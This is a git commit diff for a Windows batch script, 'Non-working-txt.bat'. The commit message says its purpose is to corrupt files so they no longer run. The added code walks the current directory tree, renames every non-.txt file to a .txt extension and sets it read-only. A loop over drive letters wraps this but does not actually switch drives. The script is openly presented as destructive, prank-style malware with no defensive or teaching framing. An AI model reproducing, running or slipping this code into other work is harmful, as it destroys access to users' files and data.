3f7cad052369c6ef95ce96d8934aa39ae663ee4e
Pushkar Sharma <96145925+pushkarsharma23@users.noreply.github.com>
2023-05-04 16:13:54 +0530

    Update Non-working-txt.bat
    This batch script can rename all the file extensions from the actual one to ".txt", and after doing that, It'll corrupt all the files, so that the files should not able to run anymore.

--- Non-working-txt.bat
+++ Non-working-txt.bat
@@ -1,13 +1,14 @@
-REN *.DOC *.TXT
-
-REN *.JPEG *.TXT
-
-REN *.LNK *.TXT
-
-REN *.AVI *.TXT
-
-REN *.MPEG *.TXT
-
-REN *.COM *.TXT
-
-REN *.BAT *.TXT
+@echo off
+rem Loop through all drives
+for %%d in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
+    rem Loop through all directories in the current drive
+    for /r %%f in (*) do (
+        rem Check if the file extension is not already .txt
+        if not "%%~xf"==".txt" (
+            rem Rename the file to have a .txt extension
+            ren "%%f" "%%~nf.txt"
+            rem Make the file read-only
+            attrib +r "%%~nf.txt"
+        )
+    )
+)
